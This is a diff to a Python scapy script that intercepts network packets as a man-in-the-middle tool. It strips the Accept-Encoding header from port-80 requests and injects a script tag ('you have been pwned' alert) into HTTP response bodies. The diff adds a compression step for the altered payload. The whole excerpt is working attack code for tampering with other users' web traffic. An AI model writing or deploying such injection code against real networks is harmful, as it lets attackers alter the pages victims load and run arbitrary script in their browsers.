@@ -43,9 +43,10 @@ def intercept_packets(packet):
 	   # print(scapy_packet.show())
 	   	http_request = scapy_packet[http.HTTPRequest]
 		if scapy_packet[scapy.TCP].dport == 80:
-			http_request.Accept_Encoding = ""
+			http_request.Accept_Encoding = "" #this field should be able to be toggled or something
 			new_packet = set_http(scapy_packet, http_request)
 			packet.set_payload(str(new_packet))
+			
 			print("req")
 
 	elif (scapy_packet.haslayer(scapy.Raw)):
@@ -55,7 +56,7 @@ def intercept_packets(packet):
 			load = inject_code_reply(load)
 			new_packet = set_load(scapy_packet, load)
 			packet.set_payload(str(new_packet))
-			new_packet.show()
+			print(new_packet[scapy.IP].options)
 			print("pwn")
 	
 	packet.accept()
@@ -66,8 +67,12 @@ def inject_code_reply(load):
 	return load.replace("<body>", "<body><script>alert(\'you have been pwned\');</script>")
 
 
+def gzip_load(load):
+	return zlib.compress(load)
+
 def set_load(packet, load):
-	packet[scapy.Raw].load = load
+	compressed_load = gzip_load(load)
+	packet[scapy.Raw].load = compressed_load
 	del packet[scapy.IP].len
 	del packet[scapy.IP].chksum
 	del packet[scapy.TCP].chksum
